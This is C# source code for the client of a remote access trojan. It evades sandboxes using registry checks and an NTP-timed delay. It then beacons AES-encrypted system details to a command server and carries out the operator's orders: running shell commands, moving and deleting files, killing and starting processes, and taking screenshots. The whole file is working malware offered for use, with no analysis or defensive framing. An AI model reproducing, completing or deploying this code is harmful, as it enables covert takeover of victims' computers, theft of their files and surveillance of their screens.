using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using Newtonsoft.Json;
using System.IO;
using System.Net.Http;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Net;
using System.Security.Cryptography;

namespace EasyContral
{
    internal class Program
    {
        static string Key = "jV5lO66M/CmXk3OP067sLbgfYTAanFcAT8oOhSzUYtw=";
        static string IV = "rNQez1Kfq8OqujG5EuyrVA==";

        static string ClientID = SystemInfo.GetClientID();
        static string CPUInfo = SystemInfo.GetCpuName();
        static string OSInfo = SystemInfo.GetSystemVersion();
        static string MemoryInfo = SystemInfo.GetMemoryInMb();
        static string HostName = SystemInfo.GetSystemName();
        static List<string> DriveInfo = SystemInfo.GetDrive();
        static int WaitTime = 5000;
        static void Main(string[] args)
        {
            if (AntiSandBox())
            {
                return;
            }

            string Drive = "";
            foreach (string dirve in DriveInfo)
            {
                Drive += dirve + "|";
            }
            HttpClient client = new HttpClient();
            while (true)
            {
                try
                {
                    Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
                    Dictionary<string, string> State = new Dictionary<string, string>();
                    Dictionary<string, string> Data = new Dictionary<string, string>();
                    State.Add("Type", "Connecting");
                    State.Add("ClientID", ClientID);
                    Data.Add("CPUInfo", CPUInfo);
                    Data.Add("OSInfo", OSInfo);
                    Data.Add("MemoryInfo", MemoryInfo);
                    Data.Add("HostName", HostName);
                    DicMessage.Add("State", State);
                    DicMessage.Add("Data", Data);
                    string JsonMessage = DicToJson(DicMessage);
                    JsonMessage = AESEncrypt(JsonMessage, Key, IV);
                    var content = new StringContent(JsonMessage, Encoding.UTF8, "application/json");
                    HttpResponseMessage Response = client.PostAsync("http://127.0.0.1:4400/", content).Result;
                    string ResponseBody = Response.Content.ReadAsStringAsync().Result;
                    ResponseBody = AESDecrypt(ResponseBody, Key, IV);
                    Dictionary<string, Dictionary<string, string>> result = new Dictionary<string, Dictionary<string, string>>();
                    result = JsonToDic(ResponseBody);
                    DicMessage.Clear();
                    State.Clear();
                    Data.Clear();
                    string Type = result["State"]["Type"];
                    string Command = result["Data"]["ServerMessage"];
                    switch (Type)
                    {
                        case "CMD":
                            string output = GeneralContral.Shell(Command);
                            SendToServer(result, output, "CMDResult");
                            break;
                        case "Drives":
                            SendToServer(result, Drive, "DirResult");
                            break;
                        case "Files":
                            string files = FileContral.GetFileList(Command);
                            SendToServer(result, files, "FilesResult");
                            break;
                        case "File_Upload":
                            string file = result["Data"]["FileData"];
                            FileContral.UploadFile(Command, file);
                            SendToServer(result, "OK", "File_UploadResult");
                            break;
                        case "File_Download":
                            string FileName = Path.GetFileName(Command);
                            string FileTxt = FileContral.DownloadFile(Command);
                            SendToServer(result, FileName + "?" + FileTxt, "File_DownloadResult");
                            break;
                        case "File_ReName":
                            string NewName = Command.Split('?')[0];
                            string OldName = Command.Split('?')[1];
                            FileContral.RenameFile(OldName, NewName);
                            SendToServer(result, "OK", "File_ReNameResult");
                            break;
                        case "File_Delete":
                            FileContral.DeleteFile(Command);
                            SendToServer(result, "OK", "File_DeleteResult");
                            break;
                        case "GetProcess":
                            Dictionary<string, Dictionary<string, string>> Processs = GeneralContral.AllProcess();
                            string Processs_ = JsonConvert.SerializeObject(Processs);
                            SendToServer(result, Processs_, "GetProcessResult");
                            break;
                        case "KillProcess":
                            GeneralContral.KillProcess(Command);
                            SendToServer(result, "OK", "KillProcessResult");
                            break;
                        case "CreateProcess":
                            GeneralContral.StartProcess(Command);
                            SendToServer(result, "OK", "StartProcessResult");
                            break;
                        case "GetDesktop":
                            string base64img = GeneralContral.ScreenShot();
                            SendToServer(result, base64img, "GetDesktopResult");
                            break;
                        case "SetSleepTime":
                            WaitTime = int.Parse(Command) * 1000;
                            break;
                    }
                }
                catch(AggregateException ex) 
                {
                    continue;
                }
                Thread.Sleep(WaitTime);
            }
        }
        static bool AntiSandBox()
        {
            if (IsRegistryKeyExists(@"SOFTWARE\Tencent\QQ") || IsRegistryKeyExists(@"SOFTWARE\Tencent\WeChat"))
            {
                return true;
            }
            ulong time = GetNetworkTimeInSeconds();
            while (true)
            {
                ulong now = GetNetworkTimeInSeconds();
                if (now - time == 60)
                {
                    return false;
                }
            }
        }
        public static ulong GetNetworkTimeInSeconds()
        {
            const string ntpServer = "time.windows.com";
            var ntpData = new byte[48];
            ntpData[0] = 0x1B;

            var addresses = Dns.GetHostEntry(ntpServer).AddressList;
            var ipEndPoint = new IPEndPoint(addresses[0], 123);
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
            {
                socket.Connect(ipEndPoint);
                socket.Send(ntpData);
                socket.Receive(ntpData);
            }
            const byte serverReplyTime = 40;
            ulong intPart = BitConverter.ToUInt32(ntpData, serverReplyTime);
            ulong fractPart = BitConverter.ToUInt32(ntpData, serverReplyTime + 4);
            intPart = SwapEndianness(intPart);
            fractPart = SwapEndianness(fractPart);
            ulong milliseconds = (intPart * 1000) + ((fractPart * 1000) / 0x100000000L);
            ulong seconds = milliseconds / 1000;
            return seconds;
        }
        private static uint SwapEndianness(ulong x)
        {
            return (uint)(((x & 0x000000ff) << 24) + ((x & 0x0000ff00) << 8) + ((x & 0x00ff0000) >> 8) + ((x & 0xff000000) >> 24));
        }
        private static bool IsRegistryKeyExists(string registryPath)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath))
            {
                return key == null;
            }
        }
        static void SendToServer(Dictionary<string, Dictionary<string, string>> result,string output,string Type) 
        {
            Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
            Dictionary<string, string> State = new Dictionary<string, string>();
            Dictionary<string, string> Data = new Dictionary<string, string>();
            HttpClient client_ = new HttpClient();
            State.Add("Type", Type);
            State.Add("ClientID", ClientID);
            Data.Add("Result", output);
            DicMessage.Add("State", State);
            DicMessage.Add("Data", Data);
            string JsonMessage_ = DicToJson(DicMessage);
            JsonMessage_ = AESEncrypt(JsonMessage_, Key, IV);
            var content_ = new StringContent(JsonMessage_, Encoding.UTF8, "application/json");
            client_.PostAsync("http://127.0.0.1:4400/", content_);
        }
        static string DicToJson(Dictionary<string,Dictionary<string,string>> DicMessage)
        {
            string Json = JsonConvert.SerializeObject(DicMessage, Formatting.Indented);
            return Json;
        }
        static Dictionary<string, Dictionary<string, string>> JsonToDic(string Json)
        {
            Dictionary<string, Dictionary<string, string>> Dic = JsonConvert.DeserializeObject<Dictionary<string, Dictionary<string, string>>>(Json);
            return Dic;
        }
        public static string AESEncrypt(string plainText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }
        public static string AESDecrypt(string cipherText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }


    }
}
